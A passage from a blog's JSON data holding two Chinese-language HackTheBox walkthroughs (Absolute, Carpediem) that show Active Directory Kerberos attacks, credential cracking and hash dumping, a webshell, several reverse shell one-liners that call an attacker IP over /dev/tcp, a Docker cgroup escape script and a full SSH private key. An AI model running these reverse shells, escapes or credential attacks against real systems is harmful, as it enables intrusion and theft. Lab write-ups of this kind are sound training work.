HackTheBox","slug":"Absolute-HackTheBox","date":"2022-09-27T07:53:34.000Z","updated":"2023-05-29T00:50:25.693Z","comments":true,"path":"2022/09/27/Absolute-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/09/27/Absolute-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/498 10.10.11.181 端口扫描80和其他常规域端口： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455$ nmap -sC -sV -Pn 10.10.11.181Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-27 13:53 CSTNmap scan report for 10.10.11.181Host is up (0.19s latency).Not shown: 988 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-title: Absolute|_http-server-header: Microsoft-IIS/10.0| http-methods:|_ Potentially risky methods: TRACE88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-27 12:54:19Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)|_ssl-date: 2022-12-27T12:55:14+00:00; +7h00m00s from scanner time.| ssl-cert: Subject: commonName=dc.absolute.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb| Not valid before: 2022-06-09T08:14:24|_Not valid after: 2023-06-09T08:14:24445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.absolute.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb| Not valid before: 2022-06-09T08:14:24|_Not valid after: 2023-06-09T08:14:24|_ssl-date: 2022-12-27T12:55:12+00:00; +7h00m01s from scanner time.3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)|_ssl-date: 2022-12-27T12:55:14+00:00; +7h00m00s from scanner time.| ssl-cert: Subject: commonName=dc.absolute.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb| Not valid before: 2022-06-09T08:14:24|_Not valid after: 2023-06-09T08:14:243269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.absolute.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb| Not valid before: 2022-06-09T08:14:24|_Not valid after: 2023-06-09T08:14:24|_ssl-date: 2022-12-27T12:55:12+00:00; +7h00m01s from scanner time.Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:| date: 2022-12-27T12:55:05|_ start_date: N/A| smb2-security-mode:| 311:|_ Message signing enabled and required|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 109.34 seconds 80没什么东西： 图片exif里可以得到一些用户名： 12345James RobertsMichael ChaffreyDonald KlaySarah OsvaldJeffer Robinson kerberos enum通过kerberos枚举用户名，得到的部分用户名可以和前面图片exif信息中的全名对应上，所以可以根据规则生成更全面的用户名列表： attackdebris/kerberos_enum_userlists: Collection of username lists for enumerating kerberos domain usershttps://github.com/attackdebris/kerberos_enum_userlists 1234567./kerbrute_linux_amd64 userenum --dc absolute.htb -d absolute.htb /usr/share/wordlists/kerberos_enum_userlists/A-Z.Surnames.txt2022/12/06 21:13:10 &gt; [+] VALID USERNAME: J.ROBINSON@absolute.htb2022/12/06 21:13:10 &gt; [+] VALID USERNAME: J.ROBERTS@absolute.htb2022/12/06 21:13:37 &gt; [+] VALID USERNAME: L.MOORE@absolute.htb2022/12/06 21:14:01 &gt; [+] VALID USERNAME: N.SMITH@absolute.htb2022/12/06 21:15:05 &gt; [+] VALID USERNAME: S.JOHNSON@absolute.htb users.txt12345678J.ROBINSON@absolute.htbJ.ROBERTS@absolute.htbL.MOORE@absolute.htbN.SMITH@absolute.htbS.JOHNSON@absolute.htbM.Chaffrey@absolute.htbD.Klay@absolute.htbS.Osvald@absolute.htb ASREP Roasting执行ASREP Roasting得到D.Klay的hash，破解出来密码： 1234567python3 ~/Tools/impacket/examples/GetNPUsers.py absolute.htb/ -no-pass -usersfile users.txt$krb5asrep$23$D.Klay@absolute.htb@ABSOLUTE.HTB:b228229f01fed39738c60439ff9a3d02$84c4256df2622e0f458948f46bd593aee704c15942840a9914af5cbd8698a25f44966149d8f6834c2d888e1d96100649e26a26945cda8fe2e80cf7cb4c16cf8977a8cca3f6670509a5cfbf88f76f87b4303170fb50f1c8af41d8b8d6b9b57e2243d0f11daf0486ea8bc55e565b88caa32c36b84af7b9c51d82fe20262b3b41ae458dab1eb038b78f699c23e1d49d20fa9b88262039e23d8ffe565a33c66cee3273ff195349579757312cafeb63b25bbebcf662c26162fb3c2d4c3519fcbcd291b8120fa6eec8aba7bc0c0df993b1f7ca291f7cbe277ea90cb64af6a75bf0a9a5dd99b85b21895e5623ee663esudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtDarkmoonsky248girl ($krb5asrep$23$D.Klay@absolute.htb@ABSOLUTE.HTB) d.klayd.klay用户请求票据，使用票据继续操作： 12python3 ~/Tools/impacket/examples/getTGT.py 'absolute.htb/d.klay:Darkmoonsky248girl'export KRB5CCNAME=d.klay.ccache 使用crackmapexec去获取ldap信息，描述中得到svc_smb密码： 123~/Tools/CrackMapExec/cme ldap -u d.klay -d absolute.htb -k --kdcHost dc.absolute.htb --users 10.10.11.181LDAP 10.10.11.181 389 DC svc_smb AbsoluteSMBService123! SMBsmb账户获取票据后可以访问smb： 123impacket-getTGT 'absolute.htb/svc_smb:AbsoluteSMBService123!'export KRB5CCNAME=svc_smb.ccacheimpacket-smbclient svc_smb@dc.absolute.htb -k -no-pass test.exe获取 test.exe 文件并在连接了 vpn 的 Windows 机器上运行它。然后运行wireshark抓取请求(首先是有一些dns请求，更新hosts后能够看到LDAP请求，并且得到的用户名格式需要自己根据前面的改一下)，见如下抓取信息。找到新凭证 1absolute.htb\\m.lovegod:AbsoluteLDAP2022! m.lovegod现在终于有一个普通用户账号了，同样请求票据进一步枚举： 12impacket-getTGT absolute.htb/m.lovegod:AbsoluteLDAP2022!export KRB5CCNAME=m.lovegod.ccache 从使用 python 的 ldap 枚举中，仅支持以下身份验证类型：GSSAPI、GSS-SPNEGO、EXTERNAL、DIGEST-MD5。然而，官方的 bloodhound-python 还不支持 kerberos。因此，改用了这个分支： jazzpizazz/BloodHound.py-Kerberos: A Python based ingestor for BloodHoundhttps://github.com/jazzpizazz/BloodHound.py-Kerberos 1python3 bloodhound.py -u m.lovegod -k -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 --dns-tcp --zip -no-pass -c All 从收集到的信息中，我们了解到：m.lovegod – owns –&gt; Group Network Audit – Generic Write –&gt; winrm_user winrm_user这里云了，看wp是要自己设置一个windows server进行操作 (主要是当时BloodHound给出的是windows的命令，windows机器更方便操作，现在4.3.1之后的版本也同时有Linux利用命令了) 设置 Windows 服务器，我使用 2019 安装 ActiveDirectory 模块 为 absolute.htb 添加hosts文件条目，不要添加 dc.absolute.htb，让它自行解决。 将 Internet 时间服务器更改为 absolute.htb Chagen网络adatpr DNS服务器到目标DC IP 然后运行以下命令，让它快点！DC 非常定期地重置 AD 值，以复制和粘贴就绪的方式准备东西 在 Windows Server 上，将用户 m.lovegod 添加到“Network Audit”组 123456$dc_domain=\"ABSOLUTE.HTB\"$SecPassword = ConvertTo-SecureString \"AbsoluteLDAP2022!\" -AsPlainText -Force$Cred = New-Object System.Management.Automation.PSCredential('ABSOLUTE.HTB\\m.lovegod', $SecPassword)Add-DomainObjectAcl -Credential $Cred -TargetIdentity \"Network Audit\" -Rights all -DomainController DC.ABSOLUTE.HTB -principalidentity \"m.lovegod\"Add-ADPrincipalGroupMembership -Identity m.lovegod -MemberOf 'Network Audit' -Credential $Cred -Server DC.ABSOLUTE.HTBGet-DomainGroupMember -Identity 'network audit' -Domain $dc_domain -DomainController DC.ABSOLUTE.HTB -Credential $cred 只使用impacket的方法(不是官方版本，自己注意别把本地环境搞炸了)： [owneredit.py] New example script to change an object’s owner by ShutdownRepo · Pull Request #1323 · fortra/impackethttps://github.com/fortra/impacket/pull/1323 12345678# Modify group rights to allimpacket-dacledit absolute.htb/m.lovegod:AbsoluteLDAP2022! -k -target-dn 'DC=absolute,DC=htb' -dc-ip 10.10.11.181# Add user to groupimpacket-owneredit -k absolute.htb/m.lovegod:AbsoluteLDAP2022! -dc-ip 10.10.11.181 -action write -new-owner 'm.lovegod' -target 'Network Audit'# Check if user has been addedimpacket-dacledit absolute.htb/m.lovegod:AbsoluteLDAP2022! -k -target-dn 'DC=absolute,DC=htb' -dc-ip 10.10.11.181 -action read -principal 'm.lovegod' -target 'Network Audit' 用户 m.lovegod 添加到“Network Audit”组之后，在kali上： ShutdownRepo/pywhisker: Python version of the C# tool for “Shadow Credentials” attackshttps://github.com/ShutdownRepo/pywhisker 12345678910ntpdate -s absolute.htb &amp;&amp; impacket-getTGT absolute.htb/m.lovegod:AbsoluteLDAP2022!export KRB5CCNAME=m.lovegod.ccachepython3 ~/tools/pywhisker/pywhisker.py -d absolute.htb -u \"m.lovegod\" -k --no-pass -t \"winrm_user\" --action \"add\"# 使用certipy-ad的方法，更方便KRB5CCNAME=m.lovegod.ccache certipy shadow auto -username m.lovegod@absolute.htb -account winrm_user -k -target dc.absolute.htb ...[*] Saved credential cache to 'winrm_user.ccache'...[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2 上面的 pywhisker 命令应该生成一个 pfx 文件和一个密码。然后使用 PKINITtools 使用 pfx 获取票证： 1python3 ~/tools/PKINITtools/gettgtpkinit.py absolute.htb/winrm_user -cert-pfx &lt;pfx&gt; -pfx-pass &lt;password&gt; winrm_user_ccache 请注意，有一个为 winrm_user 生成的缓存。然后编辑 /etc/krb5.conf 文件以确保所有内容都在大写中。 123456789# Ensure the realms in &#x2F;etc&#x2F;krb5.conf are in UPPERCASE[libdefaults] default_realm &#x3D; ABSOLUTE.HTB[realms] ABSOLUTE.HTB &#x3D; &#123; kdc &#x3D; DC.ABSOLUTE.HTB admin_server &#x3D; ABSOLUTE.HTB &#125; 使用带有 ccahe 文件的 evil-winrm 来获取 shell 12export KRB5CCNAME=winrm_user_ccachentpdate -s absolute.htb &amp;&amp; evil-winrm -i DC.ABSOLUTE.HTB -r ABSOLUTE.HTB user flagwinrm_user桌面得到user flag: 提权信息 No-Fix Local Privilege Escalation Using KrbRelay With Shadow Credentials | Icyguider’s Bloghttps://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html 条件满足 基本步骤： 12345678# download and compile the three tools and upload to the target# https://github.com/cube0x0/KrbRelay# https://github.com/antonioCoco/RunasCs# https://github.com/GhostPack/Rubeus/wget http://&lt;ip&gt;/KrbRelay.exe -O .\\KrbRelay.exewget http://&lt;ip&gt;/RunasCs_net4.exe -O .\\RunasCs_net4.exewget http://&lt;ip&gt;/Rubeus.exe -O .\\Rubeus.exe 使用上传的工具以 SYSTEM 身份将请求中继到 COM 服务器 12345# /network 9C:\\Users\\winrm_user\\Documents\\RunasCs_net4.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 \"C:\\Users\\winrm_user\\Documents\\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid &#123;752073A1-23F2-4396-85F0-8FDB879ED0ED&#125; -shadowcred\"# 直接添加到管理员的方法*Evil-WinRM* PS C:\\programdata&gt; .\\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 \".\\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -add-groupmember administrators winrm_user\" 这将生成一个 Rubeus.exe 命令，执行它以获得 DC$ 的 NTLM 哈希 123.\\Rubeus.exe asktgt /user:DC$ /certificate:&lt;cert&gt; /password:\"&lt;pass&gt;\" /getcredentials /show NTLM : A7864AB463177ACB9AEC553F18F42577 记下 NTLM 哈希并使用 secretsdump 获取 DC$ 上的所有哈希 1impacket-secretsdump -hashes :A7864AB463177ACB9AEC553F18F42577 'DC$@ABSOLUTE.HTB' KrbRelayUp12345*Evil-WinRM* PS C:\\programdata&gt; .\\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 \".\\KrbRelayUp.exe relay -m shadowcred -cls &#123;354ff91b-5e49-4bdc-a8e6-1cb6c6877182&#125;\"# 运行后给出的spawn中有证书和证书密码，同样再使用rubeus*Evil-WinRM* PS C:\\programdata&gt; .\\Rubeus.exe asktgt /user:DC$ /certificate:MIIK******GmkJ4CAgfQ /password:\"tW6@oE8=tX0@\" /getcredentials /show /nowrap# 得到DC$机器账户hash,同样的secretsdump# 也可以直接用hash登录，普通用户是因为在受保护的用户组里，所以不能用NTLM root flag得到Administrator hash，PTH： 1evil-winrm -i 10.10.11.181 -u Administrator -H 1f4a6093623653f6488d5aa24c75f2ea hash123456789101112131415161718Administrator\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f4a6093623653f6488d5aa24c75f2ea:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3ca378b063b18294fa5122c66c2280d4:::J.Roberts:1103:aad3b435b51404eeaad3b435b51404ee:7d6b7511772593b6d0a3d2de4630025a:::M.Chaffrey:1104:aad3b435b51404eeaad3b435b51404ee:13a699bfad06afb35fa0856f69632184:::D.Klay:1105:aad3b435b51404eeaad3b435b51404ee:21c95f594a80bf53afc78114f98fd3ab:::s.osvald:1106:aad3b435b51404eeaad3b435b51404ee:ab14438de333bf5a5283004f660879ee:::j.robinson:1107:aad3b435b51404eeaad3b435b51404ee:0c8cb4f338183e9e67bbc98231a8e59f:::n.smith:1108:aad3b435b51404eeaad3b435b51404ee:ef424db18e1ae6ba889fb12e8277797d:::m.lovegod:1109:aad3b435b51404eeaad3b435b51404ee:a22f2835442b3c4cbf5f24855d5e5c3d:::l.moore:1110:aad3b435b51404eeaad3b435b51404ee:0d4c6dccbfacbff5f8b4b31f57c528ba:::c.colt:1111:aad3b435b51404eeaad3b435b51404ee:fcad808a20e73e68ea6f55b268b48fe4:::s.johnson:1112:aad3b435b51404eeaad3b435b51404ee:b922d77d7412d1d616db10b5017f395c:::d.lemm:1113:aad3b435b51404eeaad3b435b51404ee:e16f7ab64d81a4f6fe47ca7c21d1ea40:::svc_smb:1114:aad3b435b51404eeaad3b435b51404ee:c31e33babe4acee96481ff56c2449167:::svc_audit:1115:aad3b435b51404eeaad3b435b51404ee:846196aab3f1323cbcc1d8c57f79a103:::winrm_user:1116:aad3b435b51404eeaad3b435b51404ee:8738c7413a5da3bc1d083efc0ab06cb2:::DC$:1000:aad3b435b51404eeaad3b435b51404ee:a7864ab463177acb9aec553f18f42577::: 参考资料 attackdebris/kerberos_enum_userlists: Collection of username lists for enumerating kerberos domain usershttps://github.com/attackdebris/kerberos_enum_userlists jazzpizazz/BloodHound.py-Kerberos: A Python based ingestor for BloodHoundhttps://github.com/jazzpizazz/BloodHound.py-Kerberos ShutdownRepo/pywhisker: Python version of the C# tool for “Shadow Credentials” attackshttps://github.com/ShutdownRepo/pywhisker [owneredit.py] New example script to change an object’s owner by ShutdownRepo · Pull Request #1323 · fortra/impackethttps://github.com/fortra/impacket/pull/1323 No-Fix Local Privilege Escalation Using KrbRelay With Shadow Credentials | Icyguider’s Bloghttps://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html Absolute - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Absolute-HTB-Discussion HTB - Absolute [Insane] // MeowMeowAttack’s security.loghttps://meowmeowattack.github.io/htb/absolute/ HTB: Absolute | 0xdf hacks stuffhttps://0xdf.gitlab.io/2023/05/27/htb-absolute.html HackTheBox - Absolute - YouTubehttps://www.youtube.com/watch?v=rfAmMQV_wss","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Carpediem - HackTheBox","slug":"Carpediem-HackTheBox","date":"2022-09-27T07:29:33.000Z","updated":"2022-12-05T04:37:03.393Z","comments":true,"path":"2022/09/27/Carpediem-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/09/27/Carpediem-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/478 10.10.11.167 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.167Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-27 13:12 CSTNmap scan report for 10.10.11.167Host is up (0.19s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 962176f72dc5f04ee0a8dfb4d95e4526 (RSA)| 256 b16de3fada10b97b9e57535c5bb76006 (ECDSA)|_ 256 6a1696d80529d590bf6b2a0932dc364f (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Comming SoonService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 72.62 seconds 80comming soon,得到的域名加hosts： 110.10.11.167 carpediem.htb 子域名扫描常规字典扫描子域名，发现porpal： 123gobuster vhost -u http://carpediem.htb -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txtFound: portal.carpediem.htb (Status: 200) [Size: 31090] 加hosts： 110.10.11.167 carpediem.htb portal.carpediem.htb portal.carpediem.htb在线摩托商城： 目录扫描目录扫描，在portal下发现admin： 123456789101112gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u http://portal.carpediem.htb/admin (Status: 301) [Size: 328] [--&gt; http://portal.carpediem.htb/admin/]/assets (Status: 301) [Size: 329] [--&gt; http://portal.carpediem.htb/assets/]/build (Status: 301) [Size: 328] [--&gt; http://portal.carpediem.htb/build/]/classes (Status: 301) [Size: 330] [--&gt; http://portal.carpediem.htb/classes/]/dist (Status: 301) [Size: 327] [--&gt; http://portal.carpediem.htb/dist/]/inc (Status: 301) [Size: 326] [--&gt; http://portal.carpediem.htb/inc/]/index.php (Status: 200) [Size: 31090]/libs (Status: 301) [Size: 327] [--&gt; http://portal.carpediem.htb/libs/]/plugins (Status: 301) [Size: 330] [--&gt; http://portal.carpediem.htb/plugins/]/uploads (Status: 301) [Size: 330] [--&gt; http://portal.carpediem.htb/uploads/] portal.carpediem.htb任意注册登录,更新资料的请求中发现login_type参数： 尝试将其修改为1，我们是管理员,可以访问admin界面： webshell上传季度报告处，网页上显示上传功能还在开发，但可以得到upload接口直接调用，从而上传webshell： reverse shell一个容器内的www-data: 1bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.10.14.19/4444 &lt;&amp;1' docker网段扫描这部分考试网络问题比较差，参考wp云了 探测docker网段，发现其他容器： 1234567891011121314151617181920212223Nmap scan report for 172.17.0.1PORT STATE SERVICE22/tcp open ssh80/tcp open httpNmap scan report for 172.17.0.2PORT STATE SERVICE21/tcp open ftp80/tcp open http443/tcp open httpsNmap scan report for 172.17.0.3PORT STATE SERVICE27017/tcp open unknownNmap scan report for 172.17.0.4PORT STATE SERVICE3306/tcp open mysql33060/tcp open unknownNmap scan report for 172.17.0.5PORT STATE SERVICE8118/tcp open unknown mongosh27017和8118，转到本地访问： 12345# localchisel server --reverse --port 8000# targetwww-data@3c371615b7aa:/dev/shm$ ./chisel client 10.10.14.19:8000 R:8118:172.17.0.5:8118 R:27017:172.17.0.3:27017 &amp; 访问本地8000端口，发现是Trudesk，账号密码在mongo中，破解不出来，密码是bcrypt，生成一个后直接修改数据库： 123456❯ python3 password.py$2b$10$zX4LTPwe7bEjhvQ.lbNgNuttsUcvcstL6SHHhZhIXouFObHXxYqeymongosh mongodb://127.0.0.1:27017test&gt; use trudesktrudesk&gt; db.accounts.update( &#123;\"_id\": ObjectId(\"623c8b20855cc5001a8ba13c\")&#125;, &#123;$set: &#123;\"password\": \"$2b$10$zX4LTPwe7bEjhvQ.lbNgNuttsUcvcstL6SHHhZhIXouFObHXxYqey\"&#125;&#125;); 然后使用修改的密码登录Trudesk，其中一张ticket中得到zoiper相关信息 zoiper我们知道域是 carpediem.htb，它告诉我们 9560 是用户 密码告诉我们现在是 2022 并且通过拨打 *62 我们可以收听凭据 我们从我们获得的数据开始，拨号时我们听凭据 获得的凭据是 hflaccus : AuRj4pxq9qPk 我们可以通过 ssh 连接 bcrypt.py1234567import bcryptpassword = \"password\"salt = bcrypt.gensalt(rounds=10)encoded = bcrypt.hashpw(password.encode(),salt)print(encoded) user flag使用前面得到的hflaccus账户ssh连接,得到user flag： backdrop继续云，hflaccus用户tcpdump抓到一些https流量， 使用对应私钥解密，得到jpardella账号密码： 1234567tcpdump -i any port 443 -w capturafile /etc/ssl/certs/backdrop.carpediem.htb.key/etc/ssl/certs/backdrop.carpediem.htb.key: PEM RSA private keyjpardellatGPN6AmJDZwYWdhY 8002 Backdrop这个账号密码可以登录8002端口的Backdrop： 1sshpass -p AuRj4pxq9qPk ssh hflaccus@10.10.11.167 -L 8002:127.0.0.1:8002 V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMShttps://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS 利用对应漏洞，导入恶意模块，访问执行，得到Backdrop容器shell 信息寻找有趣的文件，我们可以在 /opt 中看到一个脚本 1234567891011121314www-data@90c7f522b842:/opt$ cat heartbeat.sh#!/bin/bash#Run a site availability check every 10 seconds via cronchecksum=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh))if [[ $checksum != \"70a121c0202a33567101e2330c069b34\" ]]; then exitfistatus=$(php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost)grep \"Welcome to backdrop.carpediem.htb!\" \"$status\"if [[ \"$?\" != 0 ]]; then #something went wrong. restoring from backup. cp /root/index.php /var/www/html/backdrop/index.phpfiwww-data@90c7f522b842:/opt$ 每隔一段时间，它就会更改 index.php 文件并调用它或类似的东西 所以我们直接修改对应php文件，等待触发执行，得到容器root： 12345❯ cat index.php&lt;?php system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.10/443 0&gt;&amp;1'\");?&gt;www-data@90c7f522b842:~/html/backdrop$ rm -f index.phpwww-data@90c7f522b842:~/html/backdrop$ wget http://10.10.14.10/index.php docker逃逸 &amp; root flag之后就是逃逸，得到外部宿主机root： Escaping Docker Privileged Containers | by Vickie Li | Better Programminghttps://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1 1234567891011121314151617❯ cat script.shmkdir /dev/shm/privescmount -t cgroup -o rdma cgroup /dev/shm/privescmkdir /dev/shm/privesc/xecho 1 &gt; /dev/shm/privesc/x/notify_on_releasehost_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`echo \"$host_path/cmd\" &gt; /dev/shm/privesc/release_agentecho '#!/bin/bash' &gt; /cmdecho \"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.10/443 0&gt;&amp;1'\" &gt;&gt; /cmdchmod a+x /cmdbash -c \"echo \\$\\$ &gt; /dev/shm/privesc/x/cgroup.procs\"root@90c7f522b842:~# unshare -UrmC bashroot@90c7f522b842:~# wget http://10.10.14.10/script.sh &amp;&gt;/dev/nullroot@90c7f522b842:~# chmod +x script.shroot@90c7f522b842:~# ./script.shroot@90c7f522b842:~# root_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAn4XMDVkBUi5Cch7+bhxOLQzqofUIElWw6wNQ2MNZIi3QTUYE0cSnrCrrVSGKt1BRWrXlNjanoGJGvfENm02L+Dm9dUPbFaJjcFBG80DjrWsVfkCYSwe3g9KjCkkqXrHXtapCgERNCga82snoEgYN3z9vmsrw&#x2F;nd2D6OVsQxkIck7bzC2+p2EinjhaY9BVtO0UVkcDrMBvRq64JOkHHktYEBF95SDRHav1JW6M&#x2F;wY6lan18Zfrc2x0c+Ktavpp6KwHVXOcJveuChxMfbWOgyaubMV57iZ828vloyoUZRy4OlZr0Jxe5FQGcxWT2&#x2F;nhWKU3uo4Vi&#x2F;mSWhahNMY8s+ip7y9lJZZ4&#x2F;ZnN0nkkriO5xWwJu4+FEwDM9a2ZVbpfRAqcCNVQR5atHaGLl3pM6LDpyN9i95ks03BOo&#x2F;9U6SULuWK&#x2F;IfQjzlCLP28EJBb6W5cMBvB+yZSAGJ15fKYv2+9c4djJLefRpTq65BzjwUIxseflmyTL08WYGzSB9amCsHzAAAFiCMHoVMjB6FTAAAAB3NzaC1yc2EAAAGBAJ+FzA1ZAVIuQnIe&#x2F;m4cTi0M6qH1CBJVsOsDUNjDWSIt0E1GBNHEp6wq61UhirdQUVq15TY2p6BiRr3xDZtNi&#x2F;g5vXVD2xWiY3BQRvNA461rFX5AmEsHt4PSowpJKl6x17WqQoBETQoGvNrJ6BIGDd8&#x2F;b5rK8P53dg+jlbEMZCHJO28wtvqdhIp44WmPQVbTtFFZHA6zAb0auuCTpBx5LWBARfeUg0R2r9SVujP8GOpWp9fGX63NsdHPirWr6aeisB1VznCb3rgocTH21joMmrmzFee4mfNvL5aMqFGUcuDpWa9CcXuRUBnMVk9v54VilN7qOFYv5kloWoTTGPLPoqe8vZSWWeP2ZzdJ5JK4jucVsCbuPhRMAzPWtmVW6X0QKnAjVUEeWrR2hi5d6TOiw6cjfYveZLNNwTqP&#x2F;VOklC7livyH0I85Qiz9vBCQW+luXDAbwfsmUgBideXymL9vvXOHYyS3n0aU6uuQc48FCMbHn5Zsky9PFmBs0gfWpgrB8wAAAAMBAAEAAAGAMg6VIlccoAIeHZt2MW02ZtKXyeyO9Nno40YuF2btUFlZ9PWUy5JPHyp0oEkfMzjD3pgXbfSmkyBjnHTI1UP3ORQ9TE&#x2F;Xrqk&#x2F;VN4L9YcWKrPgkbaJU3n&#x2F;byEowjCFWCOsUbg0l&#x2F;VWy1+j4W&#x2F;cH9PAhJ5uUf9+sgsgg&#x2F;XMIjuGLEfuG40IzgmhrqYR7cLjOPDDs4cn08D+Oa3qmFAb&#x2F;kdUItDoY7E5o8EumaHGRUvFMbuxfXclTO+v7euXVjy03EKjTCL9poucY51N9XXPzqWnMq+2e2ajQwbURSsWJ8TpvHy&#x2F;0eDfUJkyOMSNAtouZczSsipukJehuoMgn169HoIHNov1mx6n5clSBhmkAAcyXqqIoW&#x2F;Qh&#x2F;7HYWa+k0t&#x2F;CKrG166DJ+DGPZbWQhWAepEKkD2QXDFJB2nY0j46InBRaKSyyqId5CKRmjQy8WuqtMNuCn623pVXUWrsEvWeVp881h1f2t8ZBHl09mFBNTBCfnwu5Y68HQhn3biU8Zmajk5xAAAAwByZ9i3MAdkAeBO59jhWcB7G14KXvlo2jyr0ZStsMH&#x2F;on63EZJo6t2uLnzq7WFkY3fqf6vTdp1ba9WA9RINMp5yd5BnITcees+VnoWQGJ3DjYXdUSES5dBejxOHoNCzF8QG7MAVnMCe+yyrGyMW1sKnWWQJW9Ni6HEPDKnvj&#x2F;hYZBI6OKST&#x2F;Pebcz8lRfMgbOsb9GheaDL6zEx9KX&#x2F;7y0HYBjm8VK9nzBjKRfnVpfBjBrQeD43YiRt+HB1a8C4ZGTQAAAMEAz1X60hD50s4&#x2F;CBlhA8Hw62Zpqqpb7eMmqRr2nLc4u&#x2F;8T3aPwS9YxgoYh9S&#x2F;R2WCZdujT0xVacNNJ86S&#x2F;QiNefqlrA5JoTS8cFB0ysqCzJeoOn109tyowui4Vv4iptx+id+u0l&#x2F;FazLwXTVZJJeks3WSI3OmSPnWQwB1vF3hrEe8LP55GEl4Jh+FiyP6WNup9satmGzcGCyKd0txwenq4PsYJ+uSNrPH&#x2F;His89hVBwEeVkkTDP0rBc4IEQ1V&#x2F;1Gt5AAAAwQDE9udhbjBnmmKHOv3G7FG9+xjGLCwZqZIyAU57jRp1TOjVm0DSnGyUhqb79tkWCjd4OVnrFQpE&#x2F;yKiynvVNPoynwc9mIoM+QO3UF7ZXl+PKqszyJiYywpHZAmZXm8f5&#x2F;Kol+R&#x2F;2SI7sPlq4ripwiOv8F5CwoP&#x2F;kf2Dgl9ryCCvo+lLsiB8rSQLuY6TXBfs+IZfggGO8Xn1JZWaF7J68DjWXo8GNdwwjdpjnoFxmBU3cEZYFjbjYBokkXD85q0KkcsAAAAOcm9vdEBjYXJwZWRpZW0BAgMEBQ&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- 